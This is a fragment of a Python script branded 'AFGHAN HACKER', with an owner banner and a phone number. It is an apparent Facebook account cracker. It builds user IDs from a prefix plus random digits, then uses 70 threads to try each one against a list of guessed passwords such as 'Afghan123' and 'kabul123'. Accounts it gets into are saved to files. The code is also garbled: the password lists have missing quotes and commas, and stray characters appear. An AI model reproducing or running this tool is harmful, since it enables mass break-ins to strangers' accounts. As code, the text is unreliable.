...
except ModuleNotFoundError:.ل...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py') اٮن.ل
import uuid
import os,sys,time,json,random,re,string,platform,base64
...
\33[1;37m------------------🎋🎋🎋🎋----------------------------🎋🎋🎋🎋🎋🎋🎋🎋🎋
→   Owner      :    💚💚💚💚
→  Facebook :    AFGHAN HACKER
→Whatsapp:     +971 52 218 3471
→   Tools       :   AFGHAN HACKER
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 999,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','۱۲۳۴۵۶'100200'102030'10002000'500500'500600'۱۲۳۴۵۶۷۸'۱۲۳۴۵۶۷۸۹'700800'100100'afghanistan123'Kabul1122'afghan1122'kabul1234']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123'Kabul1122'afghan1122'afghanistan'kabul1234'Afghaniatan'afghanistan123'100200'102030'100100'700800'10002000'500500'500600'۱۲۳۴۵۶'۱۲۳۴۵۶۷۸'ر.ا]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN DanGer.txt : CP.txt')
    print(46*'-')
